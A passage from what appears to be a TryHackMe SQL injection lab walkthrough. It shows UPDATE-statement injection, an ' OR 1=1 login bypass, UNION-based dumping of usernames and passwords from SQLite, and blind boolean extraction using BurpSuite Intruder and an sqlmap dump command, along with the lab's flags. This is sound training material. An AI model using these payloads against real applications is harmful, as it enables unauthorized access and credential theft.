class="o">=</span><span class="mi">1</span><span class="c1">--&#39; AND password = &#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&#39;</span>
</code></pre></div>
Retrieved Flag: <code>THM{727334fd0f0ea1b836a8d443f09dc8eb}</code></p>
<h3 id="sql-injection-5-update-statement">SQL Injection 5: UPDATE Statement<a class="headerlink" href="#sql-injection-5-update-statement" title="Permanent link">&para;</a></h3>
<p>Log in using the provided credentials: <code>10:toor</code>.</p>
<p>Let's look at the <code>Edit Profile</code> page and test if it is vulnerable to SQLi. We are presented with three input fields which can be updated. </p>
<p><img alt="SQL Injection 5: UPDATE Statement Form" src="../../../assets/images/thm/sqlilab/12%20-%20sqli5%20-%20update%20statement.png" /></p>
<p>It is a safe assumption that the application executes an UPDATE query based on the inputs by a user. The most likely form resembles the following.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">usertable</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">column1</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="n">column2</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="n">column3</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="o">&lt;</span><span class="k">Some</span><span class="w"> </span><span class="n">Condition</span><span class="o">&gt;</span>
</code></pre></div>
In order to test if the Edit Profile application is susceptible to SQLi, we need too figure out the column names. Let's have a look at the source-code for the webpage.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;login-form&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/sesqli5/profile&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>        <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;text-center&quot;</span><span class="p">&gt;</span>Edit Francois&#39;s Profile Information<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;nickName&quot;</span><span class="p">&gt;</span>Nick Name:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Nick Name&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;nickName&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;nickName&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;email&quot;</span><span class="p">&gt;</span>E-mail:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;E-mail&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;password&quot;</span><span class="p">&gt;</span>Password:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Password&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>            <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;btn btn-primary btn-block&quot;</span><span class="p">&gt;</span>Change<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;clearfix&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;pull-left checkbox-inline&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a>        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a>    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</code></pre></div>
Based on the source-code above, we can reasonable assume that the potential column names are: <code>nickName</code>, <code>email</code> and <code>password</code>.</p>
<p>With this knowledge, we can attempt to test for SQLi vulnerability in the update form. Keeping in mind the UPDATE syntax, let's try injecting the following injecting the following into the Nick Name field.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="s1">&#39;,nickName=&#39;</span><span class="n">test</span><span class="s1">&#39;,email=&#39;</span><span class="n">email</span><span class="err">&#39;</span><span class="c1">--</span>
</code></pre></div>
The resultant executed query resembles the following. Notice how the <code>--</code> converts everything following it to a comment which as a result is not executed.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">usertable</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">nickName</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="n">nickName</span><span class="o">=</span><span class="s1">&#39;test&#39;</span><span class="p">,</span><span class="n">email</span><span class="o">=</span><span class="s1">&#39;email&#39;</span><span class="c1">--&#39;,email=&#39;&#39; WHERE UID=&#39;1&#39;</span>
</code></pre></div>
With both fields set to their respective values, this confirms both the column names being correct and that SQLi vulnerability exists. Note that we can verify that the E-mail field is also vulnerable in the same way.</p>
<p><img alt="SQL Injection 5: UPDATE Statement Vuln" src="../../../assets/images/thm/sqlilab/13%20-%20sqli5%20-%20update%20statement.png" /></p>
<p>Now that we know that the form is vulnerable to SQLi, we can begin enumerating the the database.</p>
<p>First thing we need to identify is what kind of database is in use. We can obtain this information by asking the database to identify itself. As we don't know what kind of database the application is running, we will need to try several.</p>
<p>The following is a list of version statements which can be used to determine database type.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>MySQL and MSSQL: @@version
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>Oracle: SELECT banner FROM v$version
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>SQLite: sqlite_version()
</code></pre></div>
Let's test for MySQL and MSSQL first.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="err">&#39;</span><span class="p">,</span><span class="n">nickName</span><span class="o">=@@</span><span class="k">version</span><span class="c1">--</span>
</code></pre></div>
The fields did not change from their previous values which indicates that the database is not of type MySQL or MSSQL.</p>
<p>Let's test for Oracle.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="err">&#39;</span><span class="p">,</span><span class="n">nickName</span><span class="o">=</span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">banner</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span><span class="p">)</span><span class="c1">--</span>
</code></pre></div>
The fields did not change from their previous values which indicates that the database is not of type Oracle.</p>
<p>Let's try for SQLite.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="err">&#39;</span><span class="p">,</span><span class="n">nickName</span><span class="o">=</span><span class="n">sqlite_version</span><span class="p">()</span><span class="c1">--</span>
</code></pre></div>
We receive a version <code>3.22.0</code> back in the Nick Name field. This implies that we are working with an SQLite version 3.22.0 database.</p>
<p><img alt="SQL Injection 5: UPDATE Statement Database Type" src="../../../assets/images/thm/sqlilab/14%20-%20sqli5%20-%20update%20statement.png" /></p>
<p>Now that we know what database we are working with, we can continue with our enumeration. Let's extract all the tables.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="s1">&#39;,nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type=&#39;</span><span class="k">table</span><span class="s1">&#39; AND tbl_name NOT LIKE &#39;</span><span class="n">sqlite_</span><span class="o">%</span><span class="err">&#39;</span><span class="p">)</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="SQL Injection 5: UPDATE Statement Tables" src="../../../assets/images/thm/sqlilab/15%20-%20sqli5%20-%20update%20statement.png" /></p>
<p>Looks like we have two tables: <code>usertable</code> and <code>secrets</code>. Let's extract all the columns in the secrets table.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="s1">&#39;,nickName=(SELECT sql FROM sqlite_master WHERE type!=&#39;</span><span class="n">meta</span><span class="s1">&#39; AND sql NOT NULL AND name =&#39;</span><span class="n">secrets</span><span class="err">&#39;</span><span class="p">)</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="SQL Injection 5: UPDATE Statement Columns" src="../../../assets/images/thm/sqlilab/16%20-%20sqli5%20-%20update%20statement.png" /></p>
<p>Let's retrieve the the contents of the secret column.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="err">&#39;</span><span class="p">,</span><span class="n">nickName</span><span class="o">=</span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">secrets</span><span class="p">)</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="SQL Injection 5: UPDATE Statement Flag" src="../../../assets/images/thm/sqlilab/17%20-%20sqli5%20-%20update%20statement.png" /></p>
<p>Retrieve Flag: <code>THM{b3a540515dbd9847c29cffa1bef1edfb}</code></p>
<h2 id="vulnerable-startup-broken-authentication">Vulnerable Startup: Broken Authentication<a class="headerlink" href="#vulnerable-startup-broken-authentication" title="Permanent link">&para;</a></h2>
<p>We can bypass authentication using the techniques we learnt in the previous challenges. This login form appears to use the POST method for making HTTP requests however no client-side filtering of special characters is in place. We can go ahead and try to inject <code>1' OR 1=1--</code> to see if we can bypass authentication.</p>
<p><img alt="Vulnerable Startup: Broken Authentication Auth Pass" src="../../../assets/images/thm/sqlilab/18%20-%20vulnerable%20startup%20-%20broken%20authentication.png" /></p>
<p>Retrieved Flag: <code>THM{f35f47dcd9d596f0d3860d14cd4c68ec}</code></p>
<h3 id="vulnerable-startup-broken-authentication-2">Vulnerable Startup: Broken Authentication 2<a class="headerlink" href="#vulnerable-startup-broken-authentication-2" title="Permanent link">&para;</a></h3>
<p>This challenge builds upon the previous challenge. Our goal here is to find a way to dump all the passwords in the database to retrieve the flag without using blind injection.</p>
<p>Let's attempt authentication bypass using <code>1' OR 1=1--</code>. Note that the login form is not enforcing any client-side special character filter.</p>
<p><img alt="Vulnerable Startup: Broken Authentication Auth Pass" src="../../../assets/images/thm/sqlilab/19%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png" /></p>
<p>Looks like we are logged in as the <code>admin</code> user. Before we can proceed with dumping the passwords, we need to identify locations where the results from the login query are returned within the application.</p>
<p>A possible location to display retrieved data might be the the <code>Logged in as ...</code> field in the application. This field appears to show the username once the user is successfully logged in.</p>
<p><img alt="Vulnerable Startup: Broken Authentication Data Retrieve Location 1" src="../../../assets/images/thm/sqlilab/20%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png" /></p>
<p>Let's see if we can display some retrieved data in this field. First thing we need to do is to enumerate the number of columns. The authentication form is most likely crafting a query in the background which looks something like this:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;%username%&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;%password%&#39;</span>
</code></pre></div>
We can try enumerating the number of columns using a UNION based attack. Since we don't know the column names, we can use column numbers instead in our enumeration attempts.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="c1">--</span>
</code></pre></div>
If the number of columns are incorrect, the application will throw an <code>Invalid username or password</code> error message as the WHERE condition in the SQL query will return a FALSE. A correct number of columns should bypass authentication.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup : Broken Authentication 2 Column Enum" src="../../../assets/images/thm/sqlilab/21%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png" /></p>
<p>Looks like the table has two columns. Notice that the username in the <code>Logged in as</code> field is replaced by the integer 2 from our UNION SELECT statement. We can leverage this to begin enumerating the database.</p>
<p>Let's begin by figuring out the database type. Similar to one of the challenges above, we can enumerate different database version commands to determine what type of database we are working with.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>MySQL and MSSQL: @@version
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>Oracle: SELECT banner FROM v$version
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>SQLite: sqlite_version()
</code></pre></div>
Let's start with SQLite first as this type of database was used in previous challenges. Inject the following SQL command in the Username field on the login form.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">sqlite_version</span><span class="p">()</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Broken Authentication 2 Database Version" src="../../../assets/images/thm/sqlilab/22%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png" /></p>
<p>We have successful enumeration of the database version number. This confirms that we are working with SQLite Database Version 3.22.0. With this knowledge, we can begin enumerating the rest of the database schema. Lets continue by retrieving all the table names.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="s1">&#39; UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type=&#39;</span><span class="k">table</span><span class="s1">&#39; AND tbl_name NOT LIKE &#39;</span><span class="n">sqlite_</span><span class="o">%</span><span class="err">&#39;</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Broken Authentication 2 Tables" src="../../../assets/images/thm/sqlilab/23%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png" /></p>
<p>It looks like we only have one table named <code>users</code>. Let's enumerate all the columns in the <code>users</code> table.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="s1">&#39; UNION SELECT 1,sql FROM sqlite_master WHERE type!=&#39;</span><span class="n">meta</span><span class="s1">&#39; AND sql NOT NULL AND name =&#39;</span><span class="n">users</span><span class="err">&#39;</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Broken Authentication 2 Columns" src="../../../assets/images/thm/sqlilab/24%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png" /></p>
<p>We have successful enumeration of all the columns in the <code>users</code> table: <code>username</code>, <code>password</code>. With this knowledge, we can dump the contents of the columns.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="ss">&quot;:&quot;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Broken Authentication 2 Data Dump" src="../../../assets/images/thm/sqlilab/25%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png" /></p>
<p>We have successfully dumped the contents of the <code>users</code> table.</p>
<p>Retrieved Flag: <code>THM{fb381dfee71ef9c31b93625ad540c9fa}</code></p>
<h3 id="vulnerable-startup-broken-authentication-3-blind-injection">Vulnerable Startup: Broken Authentication 3 (Blind Injection)<a class="headerlink" href="#vulnerable-startup-broken-authentication-3-blind-injection" title="Permanent link">&para;</a></h3>
<p>In this challenge, we are unable to leverage the username display in the application to extract data from the database. Although the login form has the same vulnerability, we will need to utilize blind SQL injection techniques to retrieve the data.</p>
<p>Content-based (also known as Boolean-based) blind SQL injections rely on the attacker monitoring the response of the web applications. The premise behind content-based blind SQLi is to inject SQL queries which prompt a TRUE or FALSE response for character of the data we are interested in. By discerning differences between a response for an injected query which produces a TRUE result against a response for an injected query which produces a FALSE result, the attacker is able to retrieve data piecewise.</p>
<p>The aim is to extract the password for the user <code>admin</code> from the <code>users</code> table. We are provided with the respective column names of <code>username</code> and <code>password</code> which we can leverage without the need to enumerate them. The database type is SQLite.</p>
<p>Before we begin, we need to confirm whether the application is vulnerable to content-based blind SQL injection and evaluate the application's response to TRUE and FALSE queries.</p>
<p>Let's begin by injecting a query which always returns a FALSE.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="k">admin</span><span class="err">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Broken Authentication 2 Blind Injection FALSE" src="../../../assets/images/thm/sqlilab/26%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png" /></p>
<p>With the FALSE query, the default response of the web application is to fail authentication and display a message stating <code>Invalid username or password</code>.</p>
<p>Let's inject an always TRUE query.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="k">admin</span><span class="err">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--</span>
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Broken Authentication 2 Blind Injection TRUE" src="../../../assets/images/thm/sqlilab/27%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png" /></p>
<p>With the TRUE query, the default response of the web application is to bypass authentication and log us in.</p>
<p>Now that we know the default behaviour, let's enumerate the length of the <code>admin</code> user's password. We can test the lower bound of the password with the following statement.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="k">admin</span><span class="s1">&#39; AND LENGTH((SELECT password FROM users WHERE username = &#39;</span><span class="k">admin</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="c1">--</span>
</code></pre></div>
We get a successful login which means that the length of the password is greater than one. Now let's test the upper limit of the password.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="k">admin</span><span class="s1">&#39; AND LENGTH((SELECT password FROM users WHERE username = &#39;</span><span class="k">admin</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">50</span><span class="c1">--</span>
</code></pre></div>
We can know now that the range of the password is somewhere between 1 and 50. We can use BurpSuite's Intruder to iterate through to find the exact length of the password.</p>
<p>Open BurpSuite and and turn on <em>Intercept</em> (ensure that the browser is proxying through BurpSuite).</p>
<p><img alt="Vulnerable Startup: Broken Authentication 3 Blind Injection BurpSuite Intercept" src="../../../assets/images/thm/sqlilab/28%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png" /></p>
<p>Send the intercepted request to <em>Intruder</em> and <em>Clear</em> all payload markers. Highlight the new payload marker (in our case it is the integer length of the password) and click <em>Add</em> to insert the new payload marker.</p>
<p><img alt="Vulnerable Startup: Broken Authentication 3 Blind Injection BurpSuite Intruder" src="../../../assets/images/thm/sqlilab/29%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png" /></p>
<p>Select the <em>Payloads</em> tab on the top and under <em>Payload Sets</em> select <em>Payload Types --&gt; Numbers</em>. Configure the range to be from 1 to 50 with an increment of 1. Press <em>Start Attack</em> to begin the iterative attack.</p>
<p><img alt="Vulnerable Startup: Broken Authentication 3 Blind Injection BurpSuite Intruder Payload" src="../../../assets/images/thm/sqlilab/30%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png" /></p>
<p>BurpSuite Intruder can take some time in the Community Edition so we will need to be patient. Once the attack is complete, we can look at the results. We expect an HTTP 302 redirect when the right length of the password is guessed.</p>
<p><img alt="Vulnerable Startup: Broken Authentication 3 Blind Injection BurpSuite Intruder Results" src="../../../assets/images/thm/sqlilab/31%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png" /></p>
<p>We have successfully enumerated the password length (37) of the <code>admin</code> user. To verify, we can test the length with the query above to see if we get successful login which we do.</p>
<p>With this knowledge, we can start retrieving the passwords in a piecewise manner. In order to do this, we will leverage SQLite's <a href="https://sqlite.org/lang_corefunc.html#substr">substr</a> function.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">SUBSTR</span><span class="p">(</span><span class="n">string</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="k">start</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="o">&lt;</span><span class="k">length</span><span class="o">&gt;</span><span class="p">)</span>
</code></pre></div>
Our injected query will resemble something like the following.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="k">admin</span><span class="s1">&#39; AND SUBSTR((SELECT password FROM users WHERE username = &#39;</span><span class="k">admin</span><span class="s1">&#39;),1,1) = &#39;</span><span class="n">X</span><span class="err">&#39;</span>
</code></pre></div>
Note that we are told in the challenge that the application converts the user input to lowercase which complicates our approach as <code>X</code> is not the same as <code>x</code> when comparing password strings. We can circumvent this by injecting our characters as hex representation via the substitution type <a href="https://www.sqlite.org/printf.html#substitution_types">X</a> and then using SQLite's <a href="https://sqlite.org/lang_expr.html#castexpr">CAST</a> expression to convert the value to the datatype the database expects. Our injected query would look something like the following.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="k">admin</span><span class="s1">&#39; AND SUBSTR((SELECT password FROM users WHERE username = &#39;</span><span class="k">admin</span><span class="s1">&#39;),1,1) = CAST(X&#39;</span><span class="mi">54</span><span class="err">&#39;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nb">Text</span><span class="p">)</span><span class="c1">--</span>
</code></pre></div>
Where <code>54</code> is hex representation of ASCII <em>T</em> (0x54). We can iterate through the different permutations manually (which is very time consuming) or using BurpSuite Intruder (which also can take a significant amount of time when using the Community Edition).</p>
<p>Instead of manual enumeration or using BurpSuite, we can also use a tool called <em>sqlmap</em> which automates the process of detecting and exploiting SQL injection flaws. We can use the following command to exploit the SQLi vulnerability in the username field and dump all the passwords related to this challenge.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="gp">$ </span>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://10.10.202.208:5000/challenge3/login<span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;username=admin&amp;password=admin&quot;</span><span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span><span class="w"> </span>--dbms<span class="o">=</span>sqlite<span class="w"> </span>--technique<span class="o">=</span>b<span class="w"> </span>--threads<span class="o">=</span><span class="m">10</span><span class="w"> </span>--dump
</code></pre></div>
<br></p>
<p><img alt="Vulnerable Startup: Broken Authentication 3 Blind Injection sqlmap" src="../../../assets/images/thm/sqlilab/32%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png" /></p>
<p>Retrieved Flag: <code>THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}</code></p>
<h3 id="vulnerable-startup-vulnerable-notes">Vulnerable Startup: Vulnerable Notes<a class="headerlink" href="#vulnerable-startup-vulnerable-notes" title="Permanent link">&para;</a></h3>
